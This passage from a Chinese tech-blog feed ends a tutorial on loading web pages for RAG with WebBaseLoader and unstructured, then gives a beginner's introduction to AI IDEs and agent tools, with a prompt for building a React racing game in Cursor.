        "User-Agent": "Mozilla/5.0 (Windows NT 10.0<span class="hljs-comment">; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span>
    }
    <span class="hljs-attr">response</span> = requests.get(url, headers=headers, timeout=<span class="hljs-number">20</span>)
    response.raise_for_status()
    return response.text
​
<span class="hljs-attr">loader</span> = WebBaseLoader(web_paths=[page_url])
<span class="hljs-attr">loader.scrape_all</span> = lambda urls: [custom_scrape(url) for url in urls]
<span class="hljs-attr">doc</span> = loader.load()[<span class="hljs-number">0</span>]
<span class="hljs-attr">clean_content</span> = <span class="hljs-string">" "</span>.join(doc.page_content.replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\t"</span>, <span class="hljs-string">""</span>).split())
​
print("网页核心内容（无换行）：\n", clean_content<span class="hljs-section">[:2000]</span>)
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d939b7ab99964781836191e59b783c45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=zMw3NmA6YJskN7S%2F4lvCjr%2FB%2Bk0%3D" alt="web_1.png" loading="lazy"/></p>
<p>unstructured加载网页数据，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">import requests
from unstructured.partition.html import partition_html
​
<span class="hljs-attr">page_url</span> = <span class="hljs-string">"https://books.toscrape.com"</span>
​
<span class="hljs-attr">headers</span> = {<span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span>}
<span class="hljs-attr">html_content</span> = requests.get(page_url, headers=headers).text
​
<span class="hljs-attr">elements</span> = partition_html(text=html_content)
​
<span class="hljs-attr">all_text</span> = [elem.text.strip() for elem in elements if elem.text.strip()]
​
<span class="hljs-attr">clean_content</span> = <span class="hljs-string">" "</span>.join(<span class="hljs-string">""</span>.join(all_text).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\t"</span>, <span class="hljs-string">""</span>).split())
​
print("Unstructured直接加载网页（无换行）：\n", clean_content<span class="hljs-section">[:2000]</span>)
</code></pre>
<p>结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e179396282dd4bfab68c1abc1adc619e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=cVgBWfXs5RheqxzcK1rlmidl3E8%3D" alt="web_2.png" loading="lazy"/></p>
<p>使用对比下来WebBaseLoader更快点，适合快速提取网页内的文本。而<code>partition_html</code> 适合细粒度结构化解析网页元素</p>
<h4 data-id="heading-14">思维导图</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77b88048a7444b09ba14d768ca4969ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p625p625p625p6E5biI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771549620&amp;x-signature=ZMavh1AG8mHwXsOjVZAx%2FODQXPA%3D" alt="RAG-数据加载.png" loading="lazy"/></p>
<h4 data-id="heading-15">总结</h4>
<p>好了，RAG系统的数据加载技术就写到这，不同格式的数据应该选择不同的技术组件进行加载，这样可以提高RAG系统的准确性。其实写了那么多也只是给各位亦菲、彦祖们一个参考，更多的是需要自己上手练习和体会。还有很多文中没有列到的数据加载技术，也欢迎各位亦菲、彦祖们在评论区讨论哦。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day02：认识 AI IDE 工具]]></title>    <link>https://juejin.cn/post/7605625595569995791</link>    <guid>https://juejin.cn/post/7605625595569995791</guid>    <pubDate>2026-02-12T18:55:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595569995791" data-draft-id="7605262897649041443" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day02：认识 AI IDE 工具"/> <meta itemprop="keywords" content="前端,人工智能"/> <meta itemprop="datePublished" content="2026-02-12T18:55:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="派星"/> <meta itemprop="url" content="https://juejin.cn/user/3556272969881436"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day02：认识 AI IDE 工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3556272969881436/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    派星
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T18:55:46.000Z" title="Thu Feb 12 2026 18:55:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">学习目标</h2>
<p>之前在 z.ai 上体验 AI 编程时，你是不是也发现了网页版的诸多不便？比如没法随时保存工作成果、文件管理杂乱无章，甚至连稍复杂的项目都难以推进。别担心，这一章就来解决这些问题 —— 我们会在本地独立完成完整的编程项目，彻底摆脱网页版的限制。</p>
<ul>
<li>IDE和AI IDE有什么区别？</li>
<li>如何使用AI IDE</li>
</ul>
<h2 data-id="heading-1">写代码需要什么准备？</h2>
<p>代码就是一堆文字，通过编译器处理后，之后变为可执行文件。虽说用系统自带的记事本也能写代码，但实际用起来全是坑：</p>
<ul>
<li>所有代码都是黑字，关键字、文字、注释混在一起，根本看不清代码结构</li>
<li>没有任何智能提示，每个代码单词都得手动完整敲出来，拼错一个字母就得反复核对</li>
<li>文件多了就乱成一团，十几个文件来回切换，经常找不到要修改的那一行・程序出错只能瞎猜，崩了都不知道问题在哪，只能一行行打印日志排查</li>
</ul>
<p>这就是为啥你需要 IDE（集成开发环境）。它会给代码上色、输入时自动提示、按项目整理文件，还能精准定位错误，让你写代码效率更高、出错更少。</p>
<h3 data-id="heading-2"><code>IDE</code> VS <code>AI IDE</code></h3>
<p>在AI时代，AI IDE不再是传统IDE的简单功能叠加，而是以生成式AI重构开发工作流——传统IDE聚焦“辅助手动编码”，AI IDE则化身“智能协作伙伴”，将开发者从重复、低价值的工作中解放，核心聚焦需求定义与逻辑把控，大幅提升开发效率。</p>
<h4 data-id="heading-3">核心差异对比表</h4>



































<table><thead><tr><th>对比维度</th><th>传统IDE（如VS Code、IntelliJ IDEA（当然现在这些IDE都已支持AI功能））</th><th>AI IDE（如Cursor、GitHub Copilot X）</th></tr></thead><tbody><tr><td>核心定位</td><td>标准化编码工具集</td><td>智能协作开发伙伴</td></tr><tr><td>核心能力</td><td>语法高亮、基础补全、调试编译</td><td>代码生成、实时解释、智能调试优化</td></tr><tr><td>资料查阅方式</td><td>需手动切换环境查文档/搜资料</td><td>选中代码即可AI实时解释，无需跳出环境</td></tr><tr><td>效率提升方向</td><td>优化手动编码流程</td><td>替代重复编码、降低理解/调试成本</td></tr><tr><td>开发者角色</td><td>代码的直接生产者</td><td>需求定义者+逻辑把控者</td></tr></tbody></table>
<ol>
<li>传统IDE仅辅助手动编码，需开发者完成全流程操作；</li>
<li>AI IDE核心优势是AI驱动的代码生成、实时解释，大幅节省查资料/写重复代码的时间；</li>
<li>两者核心差异在于：AI IDE将开发者从低价值工作中解放，聚焦核心逻辑与创新。</li>
</ol>
<h3 data-id="heading-4">IDE的发展</h3>
<h4 data-id="heading-5">先搞懂：IDE到底是个啥？</h4>
<p>IDE（集成开发环境）说白了就是程序员的“一站式工作台”。你可以把它想象成：</p>
<ul>
<li>普通记事本（纯文本编辑器） + 各种实用工具（比如代码检查、运行按钮、调试器） + 专属工作间（适配不同编程语言的环境）</li>
<li>核心机制就是<strong>编辑器（写代码的地方）+ 插件（扩展功能的“小工具”）+ 环境（让代码能跑起来的“地基”）</strong> ，三者打包在一起，不用你东拼西凑。</li>
</ul>
<h4 data-id="heading-6">IDE的发展：从“纯手动”到“全自动”</h4>
<p>IDE不是一下子就这么好用的，它是跟着程序员的需求一步步进化的，核心就是从“终端纯命令”走向“图形化界面”：</p>
<h5 data-id="heading-7">早期：没有IDE，全靠“终端+纯编辑器”硬扛</h5>
<p>最早程序员写代码，连个可视化界面都没有，全在黑乎乎的“终端/命令行”里操作：</p>
<ul>
<li>用最基础的文本编辑器（比如Unix系统里的vi，后来升级成vim）写代码：没有语法高亮、没有自动补全，代码全靠手敲，写错了也不会提醒；</li>
<li>写完代码要自己敲命令编译、运行：比如敲<code>gcc 文件名.c</code>编译C语言代码，敲<code>python 文件名.py</code>运行Python代码；</li>
<li>这个阶段没有“插件”和“集成环境”的概念：编辑器只负责“写文字”，要啥功能都得自己用命令实现，比如想格式化代码，得单独装工具、敲命令，对新手特别不友好。</li>
</ul>
<h5 data-id="heading-8">过渡：图形化编辑器出现，开始“加插件”</h5>
<p>随着电脑图形界面普及，出现了带窗口、能点鼠标的编辑器（比如Notepad++、Sublime Text）：</p>
<ul>
<li>核心还是“编辑器”，但有了可视化界面：能看到代码的语法高亮（不同代码标不同颜色）、能点按钮保存/打开文件，不用记一堆命令；</li>
<li>开始支持“插件”：比如装个插件就能自动补全代码、装个插件就能检查语法错误、装个插件就能直接运行代码，相当于给基础编辑器“加外挂”；</li>
<li>但还不算完整的IDE：环境需要自己配（比如要手动装Python、Java的运行环境，还要告诉编辑器“环境在哪”），调试代码还是得靠命令，只是比纯终端方便一点。</li>
</ul>
<h5 data-id="heading-9">现在：成熟的IDE，“编辑器+插件+环境”全集成</h5>
<p>现在的主流IDE（比如VS Code、PyCharm、Eclipse）把“编辑器、插件、环境”打包得明明白白：</p>
<ul>
<li>编辑器：自带智能提示、语法高亮、代码格式化，甚至能实时提醒你哪里写错了；</li>
<li>插件：内置常用插件，也能自己装（比如Python插件、前端插件、翻译插件），点几下就能装，不用记命令；</li>
<li>环境：能自动识别或帮你配置运行环境（比如PyCharm新建项目时，能直接帮你装Python虚拟环境；VS Code能一键配置Node.js环境），写完代码点个“运行”按钮就能跑，调试代码时能直观看到每一步的变量值，不用再敲复杂的调试命令。</li>
</ul>
<h3 data-id="heading-10">核心机制拆解</h3>
<p>再回头看IDE的核心机制，就很好理解了：</p>

























<table><thead><tr><th>组成部分</th><th>通俗解释</th><th>举个例子</th></tr></thead><tbody><tr><td>编辑器</td><td>写代码的“本子”</td><td>就像带颜色标注的笔记本，能自动提醒你写字错了</td></tr><tr><td>插件</td><td>本子的“便利贴/小工具”</td><td>比如贴个“自动补全”便利贴，写代码时不用记全单词；贴个“运行”小工具，点一下就能看结果</td></tr><tr><td>环境</td><td>写代码的“书桌+工具台”</td><td>比如写Python代码需要的Python解释器、写Java需要的JDK，IDE帮你摆好，不用自己找地方放</td></tr></tbody></table>
<p>总结</p>
<ol>
<li>IDE的核心是“编辑器（写代码）+ 插件（扩功能）+ 环境（跑代码）”，本质是把程序员的工作流程打包简化；</li>
<li>发展历程是从“终端+vim纯手动操作”，到“图形化编辑器加插件”，再到“全集成的可视化IDE”；</li>
<li>进化的核心目的：让程序员不用花精力在“配环境、记命令”上，专心写代码就行。</li>
</ol>
<h3 data-id="heading-11">目前常见IDE</h3>
<p>现在主流的编程IDE都内置了AI功能，不用额外折腾就能直接用AI帮你写代码、改bug、解释代码，大大提升写代码的效率。不同IDE的AI侧重不同，有的轻量通用，有的专门做AI编程，你可以按需选：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2F" target="_blank" title="https://code.visualstudio.com/" ref="nofollow noopener noreferrer">VS Code</a>：最常用的轻量级IDE，本身免费且支持所有主流编程语言，装个AI插件（比如GitHub Copilot）就能用AI辅助编程，新手入门首选；</li>
<li><a href="https://www.trae.ai/" target="_blank" title="https://www.trae.ai/" ref="nofollow noopener noreferrer">Trae</a>：主打AI驱动的编程工具，界面简洁，AI代码生成、调试、重构的功能做得比较聚焦，不用复杂配置；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2F" target="_blank" title="https://cursor.com/" ref="nofollow noopener noreferrer">Cursor</a>：专为AI编程设计的IDE，内置GPT-4等大模型，支持直接用自然语言写代码、改代码，甚至能实时对话式编程，对新手特别友好；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.qoder.com%2F" target="_blank" title="https://www.qoder.com/" ref="nofollow noopener noreferrer">Qoder</a>：轻量的AI编程工具，侧重快速写代码、实时纠错，适合快速写小脚本或调试代码片段；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.codebuddy.com%2F" target="_blank" title="https://www.codebuddy.com/" ref="nofollow noopener noreferrer">CodeBuddy</a>：AI代码助手类IDE，除了写代码，还能帮你解释代码逻辑、生成测试用例，适合学习编程时用；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2F" target="_blank" title="https://code.visualstudio.com/" ref="nofollow noopener noreferrer">VS Code</a> + <a href="https://link.juejin.cn?target=https%3A%2F%2Fcline.bot%2F" target="_blank" title="https://cline.bot/" ref="nofollow noopener noreferrer">Cline</a>：在经典的VS Code里加装Cline插件，相当于给VS Code升级更强的AI功能，兼顾VS Code的通用性和Cline的AI能力。</li>
</ul>
<h3 data-id="heading-12">自己配置API</h3>
<p>如果觉得IDE自带的AI功能不够用（比如限制次数、效果一般），可以自己对接免费/低成本的AI开放平台API，相当于给IDE换“更强大的AI大脑”，这些平台都是国内/主流的，使用门槛低：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.volcengine.com%2Factivity%2Fcodingplan" target="_blank" title="https://www.volcengine.com/activity/codingplan" ref="nofollow noopener noreferrer">方舟Coding-Plan</a>：火山引擎的AI编程平台，有免费的API额度，适配中文编程场景，配置简单，适合新手尝试；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fbigmodel.cn%2Fglm-coding" target="_blank" title="https://bigmodel.cn/glm-coding" ref="nofollow noopener noreferrer">智谱AI开放平台</a>：主打中文大模型，AI写代码、解释代码的效果贴合国内开发者习惯，能申请免费试用额度；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.deepseek.com%2F" target="_blank" title="https://platform.deepseek.com/" ref="nofollow noopener noreferrer">DeepSeek 开放平台</a>：专门做代码大模型的平台，代码生成、调试的精准度高，有免费额度，适合对代码质量要求高的场景。</li>
</ul>
<h3 data-id="heading-13">AI agent代理</h3>
<p>如果想让AI不只是“写代码”，还能“帮你完整解决编程问题”（比如自动分析需求、写完整项目、调试全流程），就可以用AI Agent工具。你只需要自己买少量API额度，把API导入这些工具，就能用ClaudeCode这类强大的Agent功能，相当于雇了个“AI程序员助理”：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai" target="_blank" title="https://opencode.ai" ref="nofollow noopener noreferrer">OpenCode</a>：开源的AI Agent工具，支持对接多种API，能自定义AI的编程逻辑，适合想折腾、定制化需求的用户；</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fclaude.ai%2F" target="_blank" title="https://claude.ai/" ref="nofollow noopener noreferrer">ClaudeCode</a>：Anthropic旗下的AI Agent，擅长处理复杂的编程任务（比如写完整项目、排查复杂bug），需要先购买API密钥再导入使用，功能强但有一定使用成本。</li>
</ul>
<hr/>
<h4 data-id="heading-14">总结</h4>
<ol>
<li>常见AI IDE分两类：通用型（如VS Code）需装插件，专用型（如Cursor）开箱即用，新手优先选Cursor或VS Code；</li>
<li>自己配置API能替换IDE的AI引擎，推荐先试国内平台（方舟、智谱）的免费额度；</li>
<li>AI Agent是更进阶的用法，能实现“全流程AI编程”，适合处理复杂编程任务，需自行购买API后使用。</li>
</ol>
<h2 data-id="heading-15">在本地用React写个赛车游戏</h2>
<p>选择合适的IDE和AI工具后（我这里使用cursor），在本地开发一个赛车游戏！</p>
<p>step1：搭建AI skills框架和项目软件架构</p>
<pre><code class="hljs language-arduino" lang="arduino">我想用前端框架开发一个赛车游戏，给我一个软件架构方案，还有cursor中的rules和skills方案
</code></pre>
<p>step2：不断实现小功能，优化</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 完整开发提示词（车辆竞速类游戏/仿真系统）</span>
基于游戏引擎（如Unity/Unreal）或原生编程语言（如C++/Python/TypeScript），开发一套轻量级车辆竞速核心系统，需覆盖以下模块的完整设计与实现，要求功能闭环、逻辑自洽，兼顾物理真实性与交互体验：

<span class="hljs-section">#### 1. 车辆系统（新增多类型车辆定制）</span>
<span class="hljs-strong">**核心目标**</span>：构建可复用、差异化的多类型车辆模型，支持属性定制与多维度控制
<span class="hljs-bullet">-</span> 基础模型：定义通用车辆基类，派生3类核心车辆（可扩展），每类车辆绑定专属标识、外观资源、阵营属性：
<span class="hljs-bullet">  -</span> F1赛车：轻量化竞速车型，核心特征为「超高极速、高加速度、低转向半径、弱碰撞抗性」；
<span class="hljs-bullet">  -</span> 警车：均衡型功能车型，核心特征为「中高极速、中加速度、中等转向灵敏度、中等碰撞抗性，附带警笛触发逻辑」；
<span class="hljs-bullet">  -</span> 救护车：重型功能车型，核心特征为「低极速、低加速度、大转向半径、高碰撞抗性，附带应急优先通行逻辑（如AI车辆主动避让）」；
<span class="hljs-bullet">-</span> 物理属性：为每类车辆定制专属参数表（如下），支持动态调整：
  | 车辆类型 | 重量(kg) | 最大速度(km/h) | 加速度(m/s²) | 转向灵敏度 | 漂移系数 | 碰撞抗性 |
  |----------|----------|----------------|--------------|------------|----------|----------|
  | F1赛车   | 700      | 350            | 15           | 高         | 低       | 弱       |
  | 警车     | 1500     | 220            | 8            | 中         | 中       | 中       |
  | 救护车   | 2000     | 180            | 5            | 低         | 极低     | 高       |
<span class="hljs-bullet">-</span> 控制逻辑：通用控制映射（油门/刹车/转向/漂移）适配所有车型，差异化响应（如F1漂移易触发但难维持，救护车几乎无法漂移）；支持车辆状态监听（怠速/行驶/漂移/碰撞/特殊状态：如救护车应急模式、警车警笛开启）。

<span class="hljs-section">#### 2. 赛道系统（新增3类差异化赛道）</span>
<span class="hljs-strong">**核心目标**</span>：构建3类特征鲜明的赛道模型，支撑不同车辆的竞速体验，支持加载与切换
<span class="hljs-bullet">-</span> 数据结构：通用赛道基类包含「边界、分段、标记点、坐标系」，派生3类专属赛道，每类赛道定制核心参数：
<span class="hljs-bullet">  -</span> 城市街道赛道：
<span class="hljs-code">    特征：多直角弯道、窄车道、路边障碍物（路灯/护栏）、部分路段限速；
    适配车辆：警车（灵活度适配城市路况）；
    特殊规则：包含红绿灯减速区、人行道禁行区。
  - 专业竞速赛道：
    特征：大半径高速弯道、直道占比60%、宽车道、无障碍物；
    适配车辆：F1赛车（最大化极速优势）；
    特殊规则：包含加速带、弯道刹车提示线。
  - 郊区越野赛道：
    特征：凹凸路面、泥泞路段（摩擦系数低）、连续S弯道、宽缓冲区；
    适配车辆：救护车（高碰撞抗性适配复杂路况）；
    特殊规则：泥泞路段车速衰减、缓冲区无碰撞惩罚。
- 加载逻辑：支持静态加载（预设3类赛道数据）、动态切换（运行时更换赛道，保留车辆状态）；输出每类赛道的「可行驶区、碰撞体、专属规则触发区」；
- 辅助功能：赛道起点重置、圈数统计（适配不同赛道长度）、赛道边界可视化（调试模式）。
</span>
<span class="hljs-section">#### 3. 物理系统</span>
<span class="hljs-strong">**核心目标**</span>：实现简化但符合直觉的车辆物理，适配不同车型/赛道的差异化表现
<span class="hljs-bullet">-</span> 基础运动：基于牛顿运动定律，结合车辆重量/赛道摩擦系数计算速度、转向，如F1在专业赛道极速拉满，救护车在越野赛道减速衰减更慢；
<span class="hljs-bullet">-</span> 漂移逻辑：差异化漂移规则（F1仅高速弯道可漂移，救护车禁用漂移），计算漂移角度、减速系数，关联车辆漂移系数与赛道摩擦系数；
<span class="hljs-bullet">-</span> 物理约束：每类车辆绑定专属速度/转向上限，每类赛道定制地面摩擦力（如越野赛道泥泞区摩擦系数0.3，专业赛道0.9）。

<span class="hljs-section">#### 4. 碰撞检测</span>
<span class="hljs-strong">**核心目标**</span>：精准检测车辆与赛道边界/障碍物的碰撞，触发差异化反馈
<span class="hljs-bullet">-</span> 检测逻辑：采用AABB/射线检测，适配不同赛道的边界形状（城市赛道直角边界、专业赛道弧形边界）；
<span class="hljs-bullet">-</span> 碰撞反馈：碰撞力度关联车辆重量（救护车碰撞后速度衰减少，F1碰撞后易失控），赛道障碍物碰撞触发不同惩罚（城市赛道撞护栏减速30%，越野赛道撞缓冲区无惩罚）；
<span class="hljs-bullet">-</span> 边界判定：区分每类赛道的“禁行区”（如城市赛道人行道、专业赛道赛道外区域），触发对应减速规则。

<span class="hljs-section">#### 5. AI 对手系统</span>
<span class="hljs-strong">**核心目标**</span>：实现适配不同车辆/赛道的基础AI竞速能力
<span class="hljs-bullet">-</span> 路径规划：AI基于赛道类型生成专属路径（城市赛道优先避让禁行区，专业赛道优先走直道，越野赛道优先走平整路段）；
<span class="hljs-bullet">-</span> 行为逻辑：AI车辆匹配对应车型特征（AI-F1在专业赛道全程满速，AI-警车在城市赛道自动避让红绿灯，AI-救护车在越野赛道减速通过泥泞区）；
<span class="hljs-bullet">-</span> 难度分级：简单/中等/困难难度下，调整AI的“反应灵敏度+极限操作率”（如困难难度AI-F1可贴弯漂移）；
<span class="hljs-bullet">-</span> 交互规则：AI车辆识别救护车“应急模式”，主动减速/变道避让；AI警车可触发“追缉模式”，优先追击玩家车辆。

<span class="hljs-section">#### 补充要求</span>
<span class="hljs-bullet">-</span> 性能：物理计算与碰撞检测频率可配置（60Hz），多赛道/多车辆切换无帧率下降；
<span class="hljs-bullet">-</span> 扩展性：车辆/赛道模块支持新增类型（如卡车、山地赛道），无需修改核心逻辑；
<span class="hljs-bullet">-</span> 调试：提供车辆参数面板、赛道规则编辑器、AI决策日志打印功能。

---

<span class="hljs-section">### 总结</span>
<span class="hljs-bullet">1.</span> 车辆系统：明确3类核心车型的差异化参数+专属特征，适配不同赛道场景；
<span class="hljs-bullet">2.</span> 赛道系统：定义3类赛道的「物理特征+适配车辆+专属规则」，形成场景闭环；
<span class="hljs-bullet">3.</span> 物理/AI/碰撞模块：同步适配车型/赛道的差异化，保证逻辑一致性；
<span class="hljs-bullet">4.</span> 所有设计兼顾“真实性”与“可玩性”，参数表可直接落地开发。

如果需要补充某类车辆/赛道的细节（如救护车应急模式具体逻辑、城市赛道红绿灯触发规则），或适配特定引擎（如Unity）的开发规范，我可以进一步细化。
</code></pre>
<p>step3：运行
执行<code>npm run dev</code></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c247b2acec624471be6f5cc1b471986c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rS-5pif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771527346&amp;x-signature=uLCaJZd6Joi%2Fin0DMPbaAehULs4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-16">参考</h2>
